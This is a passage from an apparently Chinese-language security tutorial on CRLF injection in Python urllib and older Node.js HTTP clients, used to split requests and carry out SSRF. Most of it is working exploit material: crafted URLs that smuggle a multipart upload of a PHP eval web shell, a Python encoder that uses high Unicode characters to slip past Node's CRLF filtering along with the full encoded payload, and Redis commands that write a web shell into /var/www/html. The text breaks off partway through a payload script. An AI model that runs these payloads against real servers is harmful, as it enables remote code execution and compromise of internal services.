<span class="comment"># url = &quot;http://47.101.57.72:4000</span>
url = <span class="string">&#x27;http://47.101.57.72:4000?a=1 HTTP/1.1\r\n\r\nPOST /upload.php HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 435\r\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: zh-CN,zh;q=0.9\r\nCookie: PHPSESSID=nk67astv61hqanskkddslkgst4\r\nConnection: close\r\n\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nContent-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;\r\n\r\n100000\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nContent-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;shell.php&quot;\r\nContent-Type: application/octet-stream\r\n\r\n&lt;?php eval($_POST[whoami]);?&gt;\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nContent-Disposition: form-data; name=&quot;Upload&quot;\r\n\r\nUpload\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6--\r\n\r\nGET / HTTP/1.1\r\ntest:&#x27;</span>
<span class="comment"># ?a=1 后面的那个HTTP/1.1是为了闭合正常的HTTP状态行</span>
<span class="keyword">try</span>:
    info = urllib.request.urlopen(url).info()
    <span class="built_in">print</span>(info)

<span class="keyword">except</span> urllib.error.URLError <span class="keyword">as</span> e:
    <span class="built_in">print</span>(e)</code></pre>
<p><img src="https://p5.ssl.qhimg.com/t014cac7ba1ff8544a8.png" alt="img"></p>
<p>如上图所示，成功构造出了一个文件上传的POST请求，像这样的POST请求可以被我们用于 SSRF。下面我们分析一下整个攻击的过程。</p>
<p>原始请求数据如下：</p>
<pre><code class="highlight http"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span>
<span class="attribute">Host</span><span class="punctuation">: </span>47.101.57.72:4000</code></pre>
<p>当我们插入CRLF数据后，HTTP请求数据变成了：</p>
<pre><code class="highlight http"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span>

<span class="language-php">POST /upload.php HTTP/<span class="number">1.1</span></span>
<span class="language-php">Host: <span class="number">127.0</span>.<span class="number">0.1</span></span>
<span class="language-php">Content-Length: <span class="number">437</span></span>
<span class="language-php">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="language-php">......</span>
<span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;whoami&quot;</span>]);<span class="meta">?&gt;</span></span>
<span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;Upload&quot;</span></span>
<span class="language-php"></span>
<span class="language-php">Upload</span>
<span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span>
<span class="language-php"></span>
<span class="language-php"> HTTP/<span class="number">1.1</span></span>
<span class="language-php">Host: <span class="number">47.101</span>.<span class="number">57.72</span>:<span class="number">4000</span></span></code></pre>
<p>上次请求包的Host字段和状态行中的 <code>HTTP/1.1</code> 就单独出来了，所以我们再构造一个请求把他闭合：</p>
<pre><code class="highlight http"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span>

<span class="language-php">POST /upload.php HTTP/<span class="number">1.1</span></span>
<span class="language-php">Host: <span class="number">127.0</span>.<span class="number">0.1</span></span>
<span class="language-php">Content-Length: <span class="number">437</span></span>
<span class="language-php">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="language-php">......</span>
<span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;whoami&quot;</span>]);<span class="meta">?&gt;</span></span>
<span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;Upload&quot;</span></span>
<span class="language-php"></span>
<span class="language-php">Upload</span>
<span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span>
<span class="language-php"></span>
<span class="language-php">GET / HTTP/<span class="number">1.1</span></span>
<span class="language-php">test: HTTP/<span class="number">1.1</span></span>
<span class="language-php">Host: <span class="number">47.101</span>.<span class="number">57.72</span>:<span class="number">4000</span></span></code></pre>
<h2 id="nodejs-中的-crlf-injection"><a class="markdownIt-Anchor" href="#nodejs-中的-crlf-injection"></a> NodeJS 中的 CRLF Injection</h2>
<h3 id="http-请求路径中的-unicode-字符损坏"><a class="markdownIt-Anchor" href="#http-请求路径中的-unicode-字符损坏"></a> HTTP 请求路径中的 Unicode 字符损坏</h3>
<p>虽然用户发出的 HTTP 请求通常将请求路径指定为字符串，但Node.js最终必须将请求作为原始字节输出。JavaScript支持unicode字符串，因此将它们转换为字节意味着选择并应用适当的Unicode编码。对于不包含主体的请求，Node.js默认使用“latin1”，这是一种单字节编码字符集，不能表示高编号的Unicode字符，例如🐶这个表情。所以，当我们的请求路径中含有多字节编码的Unicode字符时，会被截断取最低字节，比如 <code>\u0130</code> 就会被截断为 <code>\u30</code>：</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250714174138058.png" alt="image-20250714174138058"></p>
<h3 id="unicode-字符损坏造成的-http-拆分攻击"><a class="markdownIt-Anchor" href="#unicode-字符损坏造成的-http-拆分攻击"></a> Unicode 字符损坏造成的 HTTP 拆分攻击</h3>
<p>刚才演示的那个 HTTP 请求路径中的 Unicode 字符损坏看似没有什么用处，但它可以在 nodejs 的 HTTP 拆分攻击中大显身手。</p>
<p>由于nodejs的HTTP库包含了阻止CRLF的措施，即如果你尝试发出一个URL路径中含有回车、换行或空格等控制字符的HTTP请求是，它们会被URL编码(但是<code>\r\n</code>实际在我的版本中会被直接屏蔽掉)，所以正常的CRLF注入在nodejs中并不能利用：</p>
<pre><code class="highlight plaintext">GET /%20/whoami HTTP/1.1  #原始请求里是空格
Host: 47.111.141.135:9999
Connection: keep-alive

GET //whoami HTTP/1.1 #原始请求为\r\n
Host: 47.111.141.135:9999
Connection: keep-alive</code></pre>
<p>但不幸的是，上述的处理Unicode字符错误意味着可以规避这些保护措施。考虑如下的URL，其中包含一些高编号的Unicode字符：</p>
<pre><code class="highlight plaintext">&gt; &#x27;http://47.101.57.72:4000/\u&#123;010D&#125;\u&#123;010A&#125;/WHOAMI&#x27;</code></pre>
<p>高版本的报文</p>
<pre><code class="highlight plaintext">GET /%C4%8D%C4%8A/WHOAMI HTTP/1.1
Host: 47.111.141.135:9999
Connection: keep-alive</code></pre>
<p>当 Node.js v8 或更低版本对此URL发出 <code>GET</code> 请求时，它不会进行编码转义，因为它们不是HTTP控制字符：</p>
<pre><code class="highlight js">&gt; http.<span class="title function_">get</span>(<span class="string">&#x27;http://47.111.141.135:9999/\u010D\u010A/WHOAMI&#x27;</span>).<span class="property">output</span>
[ <span class="string">&#x27;GET /čĊ/WHOAMI HTTP/1.1\r\nHost: 47.111.141.135:9999\r\nConnection: close\r\n\r\n&#x27;</span> ]</code></pre>
<p>但是当结果字符串被编码为 latin1 写入路径时，这些字符将分别被截断为 “\r”（%0d）和 “\n”（%0a）：</p>
<p><img src="https://p4.ssl.qhimg.com/t01820e6d889f5f8892.png" alt="img"></p>
<p>但是这在我的版本中已经没有了，无论是<code>\u&#123;010D&#125;\u&#123;010A&#125;</code>还是<code>\u010D\u010A</code>在HTTP请求中都会被解码</p>
<p>而在</p>
<pre><code class="highlight plaintext">Buffer.from(&#x27;http://47.111.141.135:9999/\u&#123;010D&#125;\u&#123;010A&#125;/WHOAMI&#x27;, &#x27;latin1&#x27;).toString()</code></pre>
<p>是可以被转义出来的</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250714181611956.png" alt="image-20250714181611956"></p>
<p>目前原因未知啊。。感觉是这个已经在高版本中被修复了，被http制裁了。。</p>
<p>那么就要收集一下这个<strong>最后适用的版本</strong>了(回头再找吧我是懒狗。。)，但是还是记录一下这些古早版本的神必漏洞吧<s>八旬漏洞会遇到白发机子吗</s></p>
<p>可见，通过在请求路径中包含精心选择的Unicode字符，攻击者可以欺骗Node.js并成功实现CRLF注入。</p>
<p>不仅是CRLF，所有的控制字符都可以通过这个构造出来。下面是我列举出来的表格，第一列是需要构造的字符，第二列是可构造出相应字符的高编号的Unicode码，第三列是高编号的Unicode码对应的字符，第四列是高编号的Unicode码对应的字符的URL编码：</p>
<table>
<thead>
<tr>
<th style="text-align:center">字符</th>
<th style="text-align:center">可由以下Unicode编码构造出</th>
<th style="text-align:center">Unicode编码对应的字符</th>
<th style="text-align:center">Unicode编码对应的字符对应的URL编码</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">回车符 \r</td>
<td style="text-align:center">\u010d</td>
<td style="text-align:center">č</td>
<td style="text-align:center">%C4%8D</td>
</tr>
<tr>
<td style="text-align:center">换行符 \n</td>
<td style="text-align:center">\u010a</td>
<td style="text-align:center">Ċ</td>
<td style="text-align:center">%C4%8A</td>
</tr>
<tr>
<td style="text-align:center">空格</td>
<td style="text-align:center">\u0120</td>
<td style="text-align:center">Ġ</td>
<td style="text-align:center">%C4%A0</td>
</tr>
<tr>
<td style="text-align:center">反斜杠 \</td>
<td style="text-align:center">\u0122</td>
<td style="text-align:center">Ģ</td>
<td style="text-align:center">%C4%A2</td>
</tr>
<tr>
<td style="text-align:center">单引号 ‘</td>
<td style="text-align:center">\u0127</td>
<td style="text-align:center">ħ</td>
<td style="text-align:center">%C4%A7</td>
</tr>
<tr>
<td style="text-align:center">反引号 `</td>
<td style="text-align:center">\u0160</td>
<td style="text-align:center">Š</td>
<td style="text-align:center">%C5%A0</td>
</tr>
<tr>
<td style="text-align:center">叹号 !</td>
<td style="text-align:center">\u0121</td>
<td style="text-align:center">ġ</td>
<td style="text-align:center">%C4%A1</td>
</tr>
</tbody>
</table>
<p>这个bug已经在Node.js10中被修复，如果请求路径包含非Ascii字符，则会抛出错误。但是对于 Node.js v8 或更低版本，如果有下列情况，任何发出HTTP请求的服务器都可能受到通过请求拆实现的SSRF的攻击：</p>
<ul>
<li>接受来自用户输入的Unicode数据</li>
<li>并将其包含在HTTP请求的路径中</li>
<li>且请求具有一个0长度的主体（比如一个 <code>GET</code> 或者 <code>DELETE</code>)</li>
</ul>
<h3 id="在-http-状态行注入恶意首部字段-2"><a class="markdownIt-Anchor" href="#在-http-状态行注入恶意首部字段-2"></a> 在 HTTP 状态行注入恶意首部字段</h3>
<p>由于 NodeJS 的这个 CRLF 注入点在 HTTP 状态行，所以如果我们要注入恶意的 HTTP 首部字段的话还需要闭合状态行中 <code>HTTP/1.1</code> ，即保证注入后有正常的 HTTP 状态行：</p>
<pre><code class="highlight js">&gt; http.<span class="title function_">get</span>(<span class="string">&#x27;http://47.101.57.72:4000/\u0120HTTP/1.1\u010D\u010ASet-Cookie:\u0120PHPSESSID=whoami&#x27;</span>).<span class="property">output</span>
[ <span class="string">&#x27;GET /ĠHTTP/1.1čĊSet-Cookie:ĠPHPSESSID=whoami HTTP/1.1\r\nHost: 47.101.57.72:4000\r\nConnection: close\r\n\r\n&#x27;</span> ]</code></pre>
<p><img src="https://p4.ssl.qhimg.com/t01833dd0e566e383b1.png" alt="img"></p>
<p>如上图所示，成功构造出了一个 Set-Cookie 首部字段，虽然后面还有一个 <code>HTTP/1.1</code> ，但我们根据该原理依然可以将其闭合：</p>
<pre><code class="highlight js">&gt; http.<span class="title function_">get</span>(<span class="string">&#x27;http://47.101.57.72:4000/\u0120HTTP/1.1\u010D\u010ASet-Cookie:\u0120PHPSESSID=whoami\u010D\u010Atest:&#x27;</span>).<span class="property">output</span>
[ <span class="string">&#x27;GET /ĠHTTP/1.1čĊSet-Cookie:ĠPHPSESSID=whoamičĊtest: HTTP/1.1\r\nHost: 47.101.57.72:4000\r\nConnection: close\r\n\r\n&#x27;</span> ]</code></pre>
<p><img src="https://p5.ssl.qhimg.com/t0196c013fcb593f5dc.png" alt="img"></p>
<p>这样，我们便可以构造 “任意” 的HTTP请求了。</p>
<h3 id="在-http-状态行注入完整-http-请求-2"><a class="markdownIt-Anchor" href="#在-http-状态行注入完整-http-请求-2"></a> 在 HTTP 状态行注入完整 HTTP 请求</h3>
<p>首先，由于 NodeJS 的这个 CRLF 注入点在 HTTP 状态行，所以如果我们要注入完整的 HTTP 请求的话需要先闭合状态行中 <code>HTTP/1.1</code> ，即保证注入后有正常的 HTTP 状态行。其次为了不让原来的 <code>HTTP/1.1</code> 影响我们新构造的请求，我们还需要再构造一次 <code>GET /</code> 闭合原来的 HTTP 请求。</p>
<p>假设目标主机存在SSRF，需要我们在目标主机本地上传文件。我们需要尝试构造如下这个文件上传的完整 POST 请求：</p>
<pre><code class="highlight http"><span class="keyword">POST</span> <span class="string">/upload.php</span> <span class="meta">HTTP/1.1</span>
<span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1
<span class="attribute">Content-Length</span><span class="punctuation">: </span>437
<span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6
<span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36
<span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
<span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate
<span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9
<span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=nk67astv61hqanskkddslkgst4
<span class="attribute">Connection</span><span class="punctuation">: </span>close

<span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;MAX_FILE_SIZE&quot;</span></span>
<span class="language-php"></span>
<span class="language-php"><span class="number">100000</span></span>
<span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;uploaded&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span>
<span class="language-php">Content-Type: application/octet-stream</span>
<span class="language-php"></span>
<span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;whoami&quot;</span>]);<span class="meta">?&gt;</span></span>
<span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;Upload&quot;</span></span>
<span class="language-php"></span>
<span class="language-php">Upload</span>
<span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span></code></pre>
<p>为了方便，我们将这个POST请求里面的所有的字符包括控制符全部用上述的高编号Unicode码表示：</p>
<pre><code class="highlight python">payload = <span class="string">&#x27;&#x27;&#x27; HTTP/1.1</span>
<span class="string"></span>
<span class="string">POST /upload.php HTTP/1.1</span>
<span class="string">Host: 127.0.0.1</span>
<span class="string">Content-Length: 437</span>
<span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36</span>
<span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
<span class="string">Accept-Encoding: gzip, deflate</span>
<span class="string">Accept-Language: zh-CN,zh;q=0.9</span>
<span class="string">Cookie: PHPSESSID=nk67astv61hqanskkddslkgst4</span>
<span class="string">Connection: close</span>
<span class="string"></span>
<span class="string">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="string">Content-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;</span>
<span class="string"></span>
<span class="string">100000</span>
<span class="string">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="string">Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;shell.php&quot;</span>
<span class="string">Content-Type: application/octet-stream</span>
<span class="string"></span>
<span class="string">&lt;?php eval($_POST[&quot;whoami&quot;]);?&gt;</span>
<span class="string">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="string">Content-Disposition: form-data; name=&quot;Upload&quot;</span>
<span class="string"></span>
<span class="string">Upload</span>
<span class="string">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span>
<span class="string"></span>
<span class="string">GET / HTTP/1.1</span>
<span class="string">test:&#x27;&#x27;&#x27;</span>.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;\r\n&quot;</span>)

<span class="keyword">def</span> <span class="title function_">payload_encode</span>(<span class="params">raw</span>):
    ret = <span class="string">u&quot;&quot;</span>
    <span class="keyword">for</span> i <span class="keyword">in</span> raw:
        ret += <span class="built_in">chr</span>(<span class="number">0x0100</span>+<span class="built_in">ord</span>(i))
    <span class="keyword">return</span> ret

payload = payload_encode(payload)
<span class="built_in">print</span>(payload)

<span class="comment"># 输出: ĠňŔŔŐįıĮıčĊčĊŐŏœŔĠįŵŰŬůšŤĮŰŨŰĠňŔŔŐįıĮıčĊňůųŴĺĠıĲķĮİĮİĮıčĊŃůŮŴťŮŴĭŌťŮŧŴŨĺĠĴĳķčĊŃůŮŴťŮŴĭŔŹŰťĺĠŭŵŬŴũŰšŲŴįŦůŲŭĭŤšŴšĻĠŢůŵŮŤšŲŹĽĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŕųťŲĭŁŧťŮŴĺĠōůźũŬŬšįĵĮİĠĨŗũŮŤůŷųĠŎŔĠıİĮİĻĠŗũŮĶĴĻĠŸĶĴĩĠŁŰŰŬťŗťŢŋũŴįĵĳķĮĳĶĠĨŋňŔōŌĬĠŬũūťĠŇťţūůĩĠŃŨŲůŭťįĹİĮİĮĴĴĳİĮķĲĠœšŦšŲũįĵĳķĮĳĶčĊŁţţťŰŴĺĠŴťŸŴįŨŴŭŬĬšŰŰŬũţšŴũůŮįŸŨŴŭŬīŸŭŬĬšŰŰŬũţšŴũůŮįŸŭŬĻűĽİĮĹĬũŭšŧťįšŶũŦĬũŭšŧťįŷťŢŰĬũŭšŧťįšŰŮŧĬĪįĪĻűĽİĮĸĬšŰŰŬũţšŴũůŮįųũŧŮťŤĭťŸţŨšŮŧťĻŶĽŢĳĻűĽİĮĹčĊŁţţťŰŴĭŅŮţůŤũŮŧĺĠŧźũŰĬĠŤťŦŬšŴťčĊŁţţťŰŴĭŌšŮŧŵšŧťĺĠźŨĭŃŎĬźŨĻűĽİĮĹčĊŃůůūũťĺĠŐňŐœŅœœŉńĽŮūĶķšųŴŶĶıŨűšŮųūūŤŤųŬūŧųŴĴčĊŃůŮŮťţŴũůŮĺĠţŬůųťčĊčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢōŁŘşņŉŌŅşœŉŚŅĢčĊčĊıİİİİİčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŵŰŬůšŤťŤĢĻĠŦũŬťŮšŭťĽĢųŨťŬŬĮŰŨŰĢčĊŃůŮŴťŮŴĭŔŹŰťĺĠšŰŰŬũţšŴũůŮįůţŴťŴĭųŴŲťšŭčĊčĊļĿŰŨŰĠťŶšŬĨĤşŐŏœŔśĢŷŨůšŭũĢŝĩĻĿľčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŕŰŬůšŤĢčĊčĊŕŰŬůšŤčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶĭĭčĊčĊŇŅŔĠįĠňŔŔŐįıĮıčĊŴťųŴĺ</span></code></pre>
<p>构造请求：</p>
<pre><code class="highlight php">&gt; http.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;http://47.101.57.72:4000/ĠňŔŔŐįıĮıčĊčĊŐŏœŔĠįŵŰŬůšŤĮŰŨŰĠňŔŔŐįıĮıčĊňůųŴĺĠıĲķĮİĮİĮıčĊŃůŮŴťŮŴĭŌťŮŧŴŨĺĠĴĳķčĊŃůŮŴťŮŴĭŔŹŰťĺĠŭŵŬŴũŰšŲŴįŦůŲŭĭŤšŴšĻĠŢůŵŮŤšŲŹĽĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŕųťŲĭŁŧťŮŴĺĠōůźũŬŬšįĵĮİĠĨŗũŮŤůŷųĠŎŔĠıİĮİĻĠŗũŮĶĴĻĠŸĶĴĩĠŁŰŰŬťŗťŢŋũŴįĵĳķĮĳĶĠĨŋňŔōŌĬĠŬũūťĠŇťţūůĩĠŃŨŲůŭťįĹİĮİĮĴĴĳİĮķĲĠœšŦšŲũįĵĳķĮĳĶčĊŁţţťŰŴĺĠŴťŸŴįŨŴŭŬĬšŰŰŬũţšŴũůŮįŸŨŴŭŬīŸŭŬĬšŰŰŬũţšŴũůŮįŸŭŬĻűĽİĮĹĬũŭšŧťįšŶũŦĬũŭšŧťįŷťŢŰĬũŭšŧťįšŰŮŧĬĪįĪĻűĽİĮĸĬšŰŰŬũţšŴũůŮįųũŧŮťŤĭťŸţŨšŮŧťĻŶĽŢĳĻűĽİĮĹčĊŁţţťŰŴĭŅŮţůŤũŮŧĺĠŧźũŰĬĠŤťŦŬšŴťčĊŁţţťŰŴĭŌšŮŧŵšŧťĺĠźŨĭŃŎĬźŨĻűĽİĮĹčĊŃůůūũťĺĠŐňŐœŅœœŉńĽŮūĶķšųŴŶĶıŨűšŮųūūŤŤųŬūŧųŴĴčĊŃůŮŮťţŴũůŮĺĠţŬůųťčĊčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢōŁŘşņŉŌŅşœŉŚŅĢčĊčĊıİİİİİčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŵŰŬůšŤťŤĢĻĠŦũŬťŮšŭťĽĢųŨťŬŬĮŰŨŰĢčĊŃůŮŴťŮŴĭŔŹŰťĺĠšŰŰŬũţšŴũůŮįůţŴťŴĭųŴŲťšŭčĊčĊļĿŰŨŰĠťŶšŬĨĤşŐŏœŔśĢŷŨůšŭũĢŝĩĻĿľčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŕŰŬůšŤĢčĊčĊŕŰŬůšŤčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶĭĭčĊčĊŇŅŔĠįĠňŔŔŐįıĮıčĊŴťųŴĺ&#x27;</span>)</code></pre>
<p><img src="https://p0.ssl.qhimg.com/t01aac9eb365660564a.png" alt="img"></p>
<p>如上图所示，成功构造出了一个文件上传的POST请求，像这样的POST请求可以被我们用于 SSRF。下面我们分析一下整个攻击的过程。</p>
<p>原始请求数据如下：</p>
<pre><code class="highlight http"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span>
<span class="attribute">Host</span><span class="punctuation">: </span>47.101.57.72:4000</code></pre>
<p>当我们插入CRLF数据后，HTTP请求数据变成了：</p>
<pre><code class="highlight http"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span>

<span class="language-php">POST /upload.php HTTP/<span class="number">1.1</span></span>
<span class="language-php">Host: <span class="number">127.0</span>.<span class="number">0.1</span></span>
<span class="language-php">Content-Length: <span class="number">437</span></span>
<span class="language-php">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="language-php">......</span>
<span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;whoami&quot;</span>]);<span class="meta">?&gt;</span></span>
<span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;Upload&quot;</span></span>
<span class="language-php"></span>
<span class="language-php">Upload</span>
<span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span>
<span class="language-php"></span>
<span class="language-php"> HTTP/<span class="number">1.1</span></span>
<span class="language-php">Host: <span class="number">47.101</span>.<span class="number">57.72</span>:<span class="number">4000</span></span></code></pre>
<p>上次请求包的Host字段和状态行中的 <code>HTTP/1.1</code> 就单独出来了，所以我们再构造一个请求把他闭合：</p>
<pre><code class="highlight http"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span>

<span class="language-php">POST /upload.php HTTP/<span class="number">1.1</span></span>
<span class="language-php">Host: <span class="number">127.0</span>.<span class="number">0.1</span></span>
<span class="language-php">Content-Length: <span class="number">437</span></span>
<span class="language-php">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="language-php">......</span>
<span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;whoami&quot;</span>]);<span class="meta">?&gt;</span></span>
<span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;Upload&quot;</span></span>
<span class="language-php"></span>
<span class="language-php">Upload</span>
<span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span>
<span class="language-php"></span>
<span class="language-php">GET / HTTP/<span class="number">1.1</span></span>
<span class="language-php">test: HTTP/<span class="number">1.1</span></span>
<span class="language-php">Host: <span class="number">47.101</span>.<span class="number">57.72</span>:<span class="number">4000</span></span></code></pre>
<h2 id="crlf-ssrf-攻击内网应用"><a class="markdownIt-Anchor" href="#crlf-ssrf-攻击内网应用"></a> CRLF + SSRF 攻击内网应用</h2>
<p>在SSRF中我们经常使用 Gopher 协议去攻击内网应用，比如Redis、MySQL、FTP等。但是当 Gopher 协议被过滤了之后，我们还可以通过HTTP协议并配合CRLF漏洞进行攻击，达到与 Gopher 协议一样的效果。</p>
<h3 id="攻击-redis"><a class="markdownIt-Anchor" href="#攻击-redis"></a> 攻击 Redis</h3>
<p>实验环境：</p>
<p><img src="https://p3.ssl.qhimg.com/t0131e105fae41b3683.png" alt="img"></p>
<p>访问目标Web服务器是一个Flask应用，可以通过传递url参数进行 SSRF：</p>
<p><img src="https://p3.ssl.qhimg.com/t010ad518fe0047f40f.png" alt="img"></p>
<p>经测试，目标主机6379端口上运行有Redis服务且只能在本地访问，但是目标服务器过滤了 Gopher 协议，要想攻击 Redis 的话还需要想别的办法。</p>
<p>首先让目标机访问我们的 VPS：</p>
<pre><code class="highlight python">/?url=http://<span class="number">47.101</span><span class="number">.57</span><span class="number">.72</span>:<span class="number">4000</span></code></pre>
<p><img src="https://p4.ssl.qhimg.com/t01de6686f7292b3fcb.png" alt="img"></p>
<p>如上图所示，发现目标Web存在Python-urllib/3.7，该版本的Urllib存在CRLF注入漏洞，所以我们的思路是通过HTTP协议配合CRLF漏洞攻击Redis。</p>
<p>这里我们只演示通过 Redis 写 Webshell，需要执行的 Redis 命令如下：</p>
<pre><code class="highlight python">flushall
config <span class="built_in">set</span> <span class="built_in">dir</span> /var/www/html/
config <span class="built_in">set</span> dbfilename shell.php
<span class="built_in">set</span> x <span class="string">&#x27;&lt;?php eval($_POST[whoami]);?&gt;&#x27;</span>
save</code></pre>
<p>然后要做的就是使用 HTTP 协议配合 CRLF 将这些命令构造成 TCP Stream 并通过 SSRF 发送给目标服务器。</p>
<p>编写脚本构造 payload：</p>
<pre><code class="highlight python"><span class="keyword">import</span> urllib.parse

payload = <span class="string">&#x27;&#x27;&#x27; HTTP/1.1</span>
<span class="string"></span>
<span class="string">flushall</span>
<span class="string">config set dir /var/www/html/</span>
<span class="string">config set dbfilename shell.php</span>
